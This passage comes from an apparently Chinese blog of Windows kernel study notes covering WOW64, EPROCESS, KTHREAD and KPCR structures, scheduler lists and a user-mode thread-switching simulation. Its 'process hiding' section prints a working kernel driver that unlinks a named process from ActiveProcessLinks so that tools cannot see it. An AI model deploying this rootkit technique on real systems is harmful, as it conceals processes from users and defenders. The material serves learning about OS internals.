alt="image-20200715151051374"></p><p>运算完成后调用对应内核函数</p><p>关于WOW64的话这边有个学习链接</p><p><a href="https://www.slideshare.net/YardenShafir/jumping-into-heavens-gate">https://www.slideshare.net/YardenShafir/jumping-into-heavens-gate</a></p><p>简而言之是把32位转换成64位，后面还是走的64位ntdll的syscall</p><p><img src="image-20200721172913416.png" alt="image-20200721172913416"></p><p>如上图所示，转换为64位</p><p><img src="image-20200721173606448.png" alt="image-20200721173606448"></p><p>因为ida是32位不能反编译，这边用64位打开查看eip偏移9处</p><p>直接是跳转，后面就是把栈中的参数按照64位调用方式传递给寄存器然后就是和64位一样的路线了</p>]]></content>
    
    
    
    <tags>
      
      <tag>re</tag>
      
      <tag>ctf</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>进程线程</title>
    <link href="/2020/08/11/%E8%BF%9B%E7%A8%8B%E7%BA%BF%E7%A8%8B/"/>
    <url>/2020/08/11/%E8%BF%9B%E7%A8%8B%E7%BA%BF%E7%A8%8B/</url>
    
    <content type="html"><![CDATA[<p>基础基础~~~</p><a id="more"></a><h1 id="进程线程"><a href="#进程线程" class="headerlink" title="进程线程"></a>进程线程</h1><h2 id="进程"><a href="#进程" class="headerlink" title="进程"></a>进程</h2><p>测试环境:Winxp</p><p>关于进程，最初始的概念就是提供了程序所能访问的空间，如x86下进程就是4gb虚拟内存空间，进程唯一提供有用的东西就是cr3寄存器，每当进程创建在0环就有一个结构体EPROCESS</p><p><img src="image-20200720101950692.png" alt="image-20200720101950692"></p><p><img src="image-20200720102133521.png" alt="image-20200720102133521"></p><p>其中第一个成员为KPROCESS</p><p>+0x000 Header           : _DISPATCHER_HEADER //表示为可等待对象（WaitForSingleObject）</p><p>+0x018 DirectoryTableBase : [2] 0x2ff04000 //为页目录表基址</p><p>+0x038 KernelTime       : 6<br>+0x03c UserTime         : 1            //进程在用户态和内核态所花费的时间</p><p>+0x05c Affinity         : 1 //规定只能在那几个cpu上跑  转换成二进制即可</p><p>+0x062 BasePriority     : 8 ‘’ //基础优先级</p><p>+0x070 CreateTime       : _LARGE_INTEGER 0x01d65e3b`60784231<br>+0x078 ExitTime         : _LARGE_INTEGER 0x0                                        //进程创建和退出的时间</p><p>+0x084 UniqueProcessId  : 0x0000075c Void                                    //PID</p><p>+0x088 ActiveProcessLinks : _LIST_ENTRY [ 0x80562358 - 0x89b7e818 ]    //双向链表 连接的所有活动的进程</p><p>//这边可以通过遍历这个双向链表来得到所有活动中的进程，如 dt _eprocess 0x80562358 -88</p><p>//也可以通过断链来实现隐藏，当然只能不让某些api找到</p><p>+0x11c VadRoot          : 0x89543e80 Void            //标志了0-2G中哪写内存被使用了</p><p>+0x0bc DebugPort        : (null)         //调试相关</p><p>+0x0c4 ObjectTable      : 0xe185e178 _HANDLE_TABLE            //句柄表</p><p>+0x174 ImageFileName    : [16]  “notepad.exe”                    //进程镜像文件名 最多16字节</p><p>+0x1a0 ActiveThreads    : 1                            //活动线程的数量</p><p>+0x1b0 Peb              : 0x7ffde000 _PEB            //进程环境块</p><h3 id="进程隐藏"><a href="#进程隐藏" class="headerlink" title="进程隐藏"></a>进程隐藏</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;ntddk.h&gt;</span></span><br><br><span class="hljs-class"><span class="hljs-keyword">enum</span> <span class="hljs-title">WIN10</span></span><br><span class="hljs-class">&#123;</span><br>g_uNextProcess = <span class="hljs-number">0x2f0</span>,<br>g_uPrevProcess = <span class="hljs-number">0x2f8</span>,<br>g_uImageFileName = <span class="hljs-number">0x450</span><br>&#125;;<br><br>PLIST_ENTRY g_pListEntryTemp = <span class="hljs-literal">NULL</span>;<br>PLIST_ENTRY g_pHeadEntry = <span class="hljs-literal">NULL</span>;<br><br><span class="hljs-function">VOID <span class="hljs-title">MyDriverUnload</span><span class="hljs-params">(PDRIVER_OBJECT pDriverObject)</span></span><br><span class="hljs-function"></span>&#123;<br>DbgPrint(<span class="hljs-string">&quot;unload;&quot;</span>);<br><span class="hljs-keyword">if</span>(g_pListEntryTemp != <span class="hljs-literal">NULL</span>)<br>&#123;<br>InsertHeadList(g_pHeadEntry, g_pListEntryTemp);<br>&#125;<br>&#125;<br><br><span class="hljs-function">VOID <span class="hljs-title">HideProcessor</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>PEPROCESS pCurrrentProcess = <span class="hljs-literal">NULL</span>;<br>PEPROCESS pPreviousProcess = <span class="hljs-literal">NULL</span>;<br><br>pCurrrentProcess = PsGetCurrentProcess();<br>pPreviousProcess = (PEPROCESS)(*((PULONG_PTR)((ULONG_PTR)pCurrrentProcess + g_uPrevProcess)) - g_uNextProcess);<br><br><span class="hljs-keyword">while</span> (pCurrrentProcess != pPreviousProcess)<br>&#123;<br><span class="hljs-keyword">if</span> (<span class="hljs-built_in">strcmp</span>(((PCHAR)((ULONG_PTR)pCurrrentProcess + g_uImageFileName)), <span class="hljs-string">&quot;temp.exe&quot;</span>) == <span class="hljs-number">0</span>)<br>&#123;<br>g_pListEntryTemp = (PLIST_ENTRY)(((ULONG_PTR)pCurrrentProcess + g_uNextProcess));<br>RemoveEntryList(g_pListEntryTemp);<br><span class="hljs-keyword">break</span>;<br>&#125;<br>pCurrrentProcess = (PEPROCESS)(*((PULONG_PTR)((ULONG_PTR)pCurrrentProcess + g_uNextProcess)) - g_uNextProcess);<br>&#125;<br>&#125;<br><br><span class="hljs-function">NTSTATUS <span class="hljs-title">DriverEntry</span><span class="hljs-params">(PDRIVER_OBJECT pDriverObject, PUNICODE_STRING pStrRegPath)</span></span><br><span class="hljs-function"></span>&#123;<br>g_pHeadEntry = (PLIST_ENTRY)((ULONG_PTR)PsGetCurrentProcess() + g_uNextProcess);<br>DbgPrint(<span class="hljs-string">&quot;start&quot;</span>);<br>__try<br>&#123;<br>HideProcessor();<br>&#125;<br>__except (EXCEPTION_EXECUTE_HANDLER)<br>&#123;<br>DbgPrint(<span class="hljs-string">&quot;something wrong!&quot;</span>);<br>&#125;<br>pDriverObject-&gt;DriverUnload = MyDriverUnload;<br><span class="hljs-keyword">return</span> STATUS_SUCCESS;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="image-20200720150207163.png" alt="image-20200720150207163"></p><p>查看id 7352，加载驱动隐藏进程</p><p><img src="image-20200720150244169.png" alt="image-20200720150244169"></p><p>可以发现ida已经无法找到进程，但是火绒剑还是可以，看来是没有使用api</p><p><img src="image-20200720150327358.png" alt="image-20200720150327358"></p><p>同样的任务管理器也无法找到进程</p><p>unload恢复一波</p><p><img src="image-20200720150400202.png" alt="image-20200720150400202"></p><p><img src="image-20200720150412684.png" alt="image-20200720150412684"></p><p><img src="image-20200720150437551.png" alt="image-20200720150437551"></p><p>可以发先ida与任务管理器都成功查找到了进程</p><h2 id="线程"><a href="#线程" class="headerlink" title="线程"></a>线程</h2><p>与进程相对应得是线程得ethread</p><p><img src="image-20200721100730610.png" alt="image-20200721100730610"></p><p>具体查看方法是kprocess得0x50处，可以发现一个双向链表链接了进程内的所有线程</p><p>因为我打开的是记事本所以俩个一样只有一个线程</p><p><img src="image-20200721100919135.png" alt="image-20200721100919135"></p><p>对应的在0x190处还能看到一个副本</p><p>分析一波具体结构，首先从kthread开始看起</p><p>+0x000 Header           : _DISPATCHER_HEADER //和eprocess一模一样，是用来表示是否可等待</p><p>+0x010 MutantListHead   : _LIST_ENTRY [ 0x5ae36ce0 - 0xeb2f81a ]<br>+0x018 InitialStack     : 0x8994da98 Void<br>+0x01c StackLimit       : 0x8994da98 Void    //与线程切换相关</p><p>+0x020 Teb              : (null)         //线程环境块，在三环时就是fs:[0]，在0环时fs指向的KPCR</p><p>+0x02c DebugActive      : 0xe8 ‘’    //如果值为-1 则表示不能使用调试寄存器</p><p>+0x034 ApcState         : _KAPC_STATE</p><p>+0x0e8 ApcQueueLock     : 0</p><p>+0x138 ApcStatePointer  : [2] (null) </p><p>+0x14c SavedApcState    : _KAPC_STATE        //这边是与APC相关的应用</p><p>+0x02d State            : 0x98 ‘’            //线程运行状态</p><p>+0x06c BasePriority     : 0 ‘’        //基础优先值</p><p>+0x070 WaitBlock        : [4] _KWAIT_BLOCK            //表示等待哪个对象中</p><p>+0x0e0 ServiceTable     : 0x8994db30 Void            //指向了系统服务表的基地址</p><p>+0x134 TrapFrame        : 0xe380d1f0 _KTRAP_FRAME        //保存现场环境</p><p>+0x140 PreviousMode     : 0 ‘’        //表示先前模式是0环还是3环</p><p>+0x1ec Cid              : _CLIENT_ID            //表示进程和线程id</p><p>+0x220 ThreadsProcess   : 0x89a86240 _EPROCESS        //指向自己所属的进程</p><p>+0x22c ThreadListEntry  : _LIST_ENTRY [ 0x0 - 0x0 ]        //所有线程得位置</p><h2 id="KPCR"><a href="#KPCR" class="headerlink" title="KPCR"></a>KPCR</h2><p><img src="image-20200721103855314.png" alt="image-20200721103855314"></p><p>+0x000 ExceptionList    : Ptr32 _EXCEPTION_REGISTRATION_RECORD    //异常处理链表<br>+0x004 StackBase        : Ptr32 Void<br>+0x008 StackLimit       : Ptr32 Void    //当前线程内核栈的基地址和大小</p><p>+0x018 Self             : Ptr32 _NT_TIB    //指向自己</p><p>+0x01c SelfPcr          : Ptr32 _KPCR    //同上</p><p>+0x020 Prcb             : Ptr32 _KPRCB        //指向扩展结构体</p><p>+0x038 IDT              : Ptr32 _KIDTENTRY    //指向IDT表基地址<br>+0x03c GDT              : Ptr32 _KGDTENTRY//GDT表基地址<br>+0x040 TSS              : Ptr32 _KTSS        //指向TSS任务段</p><p>+0x051 Number           : UChar        //CPU编号</p><p>+0x120 PrcbData         : _KPRCB        //指向扩展结构体</p><p><img src="image-20200721104412142.png" alt="image-20200721104412142"></p><p>查看_KPRCB结构体</p><p>+0x004 CurrentThread    : Ptr32 _KTHREAD        //当前线程<br>+0x008 NextThread       : Ptr32 _KTHREAD        //即将切换线程<br>+0x00c IdleThread       : Ptr32 _KTHREAD        //空闲线程</p><h2 id="等待链表-调度链表"><a href="#等待链表-调度链表" class="headerlink" title="等待链表-调度链表"></a>等待链表-调度链表</h2><p><img src="image-20200721110137217.png" alt="image-20200721110137217"></p><p>主要是kthread +0x60处    //等待链表是当线程调用了Sleep() 或者 WaitForSingleObject()等函数时，就挂到这个链表</p><p>调度链表有32个圈，就是优先级:0 - 31  0最低  31最高  默认优先级一般是8</p><p>改变优先级就是从一个圈里面卸下来挂到另外一个圈上</p><p>这32个圈是正在调度中的线程：包括正在运行的和准备运行的</p><p>比如：只有一个CPU但有10个线程在运行，那么某一时刻，正在运行的线程在KPCR中，其他9个在这32个圈中。</p><p><img src="image-20200721110401655.png" alt="image-20200721110401655"></p><p>查看一波调度链表</p><p>XP只有一个33个圈，也就是说上面这个数组只有一个，多核也只有一个.</p><p>Win7也是一样的只有一个圈，如果是64位的，那就有64个圈.</p><p>服务器版本：KiWaitListHead整个系统只有一个，但KiDispatcherReadyListHead这个数组有几个CPU就有几组</p><h2 id="模拟线程切换"><a href="#模拟线程切换" class="headerlink" title="模拟线程切换"></a>模拟线程切换</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> _CRT_SECURE_NO_DEPRECATE</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;windows.h&gt;</span></span><br><br><span class="hljs-comment">//最大支持的线程数</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> MAXGMTHREAD 100</span><br><br><span class="hljs-comment">//线程信息的结构</span><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span></span><br><span class="hljs-class">&#123;</span><br><span class="hljs-keyword">char</span>* name;<span class="hljs-comment">//线程名 相当于线程ID</span><br><span class="hljs-keyword">int</span> Flags;<span class="hljs-comment">//线程状态</span><br><span class="hljs-keyword">int</span> SleepMillsecondDot;<span class="hljs-comment">//休眠时间</span><br><br><span class="hljs-keyword">void</span>* initialStack;<span class="hljs-comment">//线程堆栈起始位置</span><br><span class="hljs-keyword">void</span>* StackLimit;<span class="hljs-comment">//线程堆栈界限</span><br><span class="hljs-keyword">void</span>* KernelStack;<span class="hljs-comment">//线程堆栈当前位置，也就是ESP</span><br><br><span class="hljs-keyword">void</span>* lpParameter;<span class="hljs-comment">//线程函数的参数</span><br><span class="hljs-keyword">void</span>(*func)(<span class="hljs-keyword">void</span>* lpParameter);<span class="hljs-comment">//线程函数</span><br>&#125;GMThread_t;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">GMThreadStartup</span><span class="hljs-params">(GMThread_t* GMThreadp)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">IdleGMThread</span><span class="hljs-params">(<span class="hljs-keyword">void</span>* lpParameter)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">PushStack</span><span class="hljs-params">(<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span>** Stackpp, <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> v)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">initGMThread</span><span class="hljs-params">(GMThread_t* GMThreadp, <span class="hljs-keyword">char</span>* name, <span class="hljs-keyword">void</span>(*func)(<span class="hljs-keyword">void</span>* lpParameter), <span class="hljs-keyword">void</span>* lpParameter)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">RegisterGMThread</span><span class="hljs-params">(<span class="hljs-keyword">char</span>* name, <span class="hljs-keyword">void</span>(*func)(<span class="hljs-keyword">void</span>* lpParameter), <span class="hljs-keyword">void</span>* lpParameter)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">SwitchContext</span><span class="hljs-params">(GMThread_t* SrcGMThreadp, GMThread_t* DstGMThreadp)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">Scheduling</span><span class="hljs-params">()</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">GMSleep</span><span class="hljs-params">(<span class="hljs-keyword">int</span> MilliSeconds)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">Thread1</span><span class="hljs-params">(<span class="hljs-keyword">void</span>*)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">Thread2</span><span class="hljs-params">(<span class="hljs-keyword">void</span>*)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">Thread3</span><span class="hljs-params">(<span class="hljs-keyword">void</span>*)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">Thread4</span><span class="hljs-params">(<span class="hljs-keyword">void</span>*)</span></span>;<br><span class="hljs-comment">//定义线程栈的大小</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> GMTHREADSTACKSIZE 0x80000</span><br><br><span class="hljs-comment">//当前线程的索引</span><br><span class="hljs-keyword">int</span> CurrentThreadIndex = <span class="hljs-number">0</span>;<br><br><span class="hljs-comment">//线程的列表</span><br>GMThread_t GMThreadList[MAXGMTHREAD] = &#123; <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span> &#125;;<br><br><span class="hljs-comment">//线程状态的标志</span><br><span class="hljs-class"><span class="hljs-keyword">enum</span> <span class="hljs-title">FLAGS</span></span><br><span class="hljs-class">&#123;</span><br>GMTHREAD_CREATE = <span class="hljs-number">0x1</span>,<br>GMTHREAD_READY = <span class="hljs-number">0x2</span>,<br>GMTHREAD_SLEEP = <span class="hljs-number">0x4</span>,<br>GMTHREAD_EXIT = <span class="hljs-number">0x8</span>,<br>&#125;;<br><br><br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>RegisterGMThread((<span class="hljs-keyword">char</span>*)<span class="hljs-string">&quot;Thread1&quot;</span>, Thread1, <span class="hljs-literal">NULL</span>);<br>RegisterGMThread((<span class="hljs-keyword">char</span>*)<span class="hljs-string">&quot;Thread2&quot;</span>, Thread2, <span class="hljs-literal">NULL</span>);<br>RegisterGMThread((<span class="hljs-keyword">char</span>*)<span class="hljs-string">&quot;Thread3&quot;</span>, Thread3, <span class="hljs-literal">NULL</span>);<br>RegisterGMThread((<span class="hljs-keyword">char</span>*)<span class="hljs-string">&quot;Thread4&quot;</span>, Thread4, <span class="hljs-literal">NULL</span>);<br><br><span class="hljs-keyword">for</span> (;;)<br>&#123;<br>Sleep(<span class="hljs-number">20</span>);<br>Scheduling();<br>&#125;<br><br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-comment">//启动线程的函数</span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">GMThreadStartup</span><span class="hljs-params">(GMThread_t* GMThreadp)</span></span><br><span class="hljs-function"></span>&#123;<br>GMThreadp-&gt;func(GMThreadp-&gt;lpParameter);<br>GMThreadp-&gt;Flags = GMTHREAD_EXIT;<br>Scheduling();<br><br><span class="hljs-keyword">return</span>;<br>&#125;<br><br><span class="hljs-comment">//空闲线程的函数</span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">IdleGMThread</span><span class="hljs-params">(<span class="hljs-keyword">void</span>* lpParameter)</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;IdleGMThread---------------\n&quot;</span>);<br>Scheduling();<br><span class="hljs-keyword">return</span>;<br>&#125;<br><br><span class="hljs-comment">//向栈中压入一个uint值</span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">PushStack</span><span class="hljs-params">(<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span>** Stackpp, <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> v)</span></span><br><span class="hljs-function"></span>&#123;<br>*Stackpp -= <span class="hljs-number">1</span>;<span class="hljs-comment">//esp - 4</span><br>**Stackpp = v;<span class="hljs-comment">//</span><br><br><span class="hljs-keyword">return</span>;<br>&#125;<br><br><span class="hljs-comment">//初始化线程的信息</span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">initGMThread</span><span class="hljs-params">(GMThread_t* GMThreadp, <span class="hljs-keyword">char</span>* name, <span class="hljs-keyword">void</span>(*func)(<span class="hljs-keyword">void</span>* lpParameter), <span class="hljs-keyword">void</span>* lpParameter)</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span>* StackPages;<br><span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span>* StackDWordParam;<br><br><span class="hljs-comment">//结构初始化赋值</span><br>GMThreadp-&gt;Flags = GMTHREAD_CREATE;<br>GMThreadp-&gt;name = name;<br>GMThreadp-&gt;func = func;<br>GMThreadp-&gt;lpParameter = lpParameter;<br><br><span class="hljs-comment">//申请空间</span><br>StackPages = (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span>*)VirtualAlloc(<span class="hljs-literal">NULL</span>, GMTHREADSTACKSIZE, MEM_COMMIT, PAGE_READWRITE);<br><span class="hljs-comment">//初始化</span><br>ZeroMemory(StackPages, GMTHREADSTACKSIZE);<br><span class="hljs-comment">//初始化地址地址</span><br>GMThreadp-&gt;initialStack = StackPages + GMTHREADSTACKSIZE;<br><span class="hljs-comment">//堆栈限制</span><br>GMThreadp-&gt;StackLimit = StackPages;<br><span class="hljs-comment">//堆栈地址</span><br>StackDWordParam = (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span>*)GMThreadp-&gt;initialStack;<br><br><span class="hljs-comment">//入栈</span><br>PushStack(&amp;StackDWordParam, (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span>)GMThreadp);<span class="hljs-comment">//通过这个指针来找到线程函数，线程参数</span><br>PushStack(&amp;StackDWordParam, (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span>)<span class="hljs-number">9</span>);<span class="hljs-comment">//平衡堆栈的(不用管)</span><br>PushStack(&amp;StackDWordParam, (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span>)GMThreadStartup);<span class="hljs-comment">//线程入口函数 这个函数负责调用线程函数</span><br>PushStack(&amp;StackDWordParam, (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span>)<span class="hljs-number">5</span>);<span class="hljs-comment">//push ebp</span><br>PushStack(&amp;StackDWordParam, (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span>)<span class="hljs-number">7</span>);<span class="hljs-comment">//push edi</span><br>PushStack(&amp;StackDWordParam, (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span>)<span class="hljs-number">6</span>);<span class="hljs-comment">//push esi</span><br>PushStack(&amp;StackDWordParam, (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span>)<span class="hljs-number">3</span>);<span class="hljs-comment">//push ebx</span><br>PushStack(&amp;StackDWordParam, (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span>)<span class="hljs-number">2</span>);<span class="hljs-comment">//push ecx</span><br>PushStack(&amp;StackDWordParam, (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span>)<span class="hljs-number">1</span>);<span class="hljs-comment">//push edx</span><br>PushStack(&amp;StackDWordParam, (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span>)<span class="hljs-number">0</span>);<span class="hljs-comment">//push eax</span><br><br><span class="hljs-comment">//当前线程的栈顶</span><br>GMThreadp-&gt;KernelStack = StackDWordParam;<br><br><span class="hljs-comment">//当前线程状态</span><br>GMThreadp-&gt;Flags = GMTHREAD_READY;<br><br><span class="hljs-keyword">return</span>;<br>&#125;<br><br><span class="hljs-comment">//将一个函数注册为单独线程执行</span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">RegisterGMThread</span><span class="hljs-params">(<span class="hljs-keyword">char</span>* name, <span class="hljs-keyword">void</span>(*func)(<span 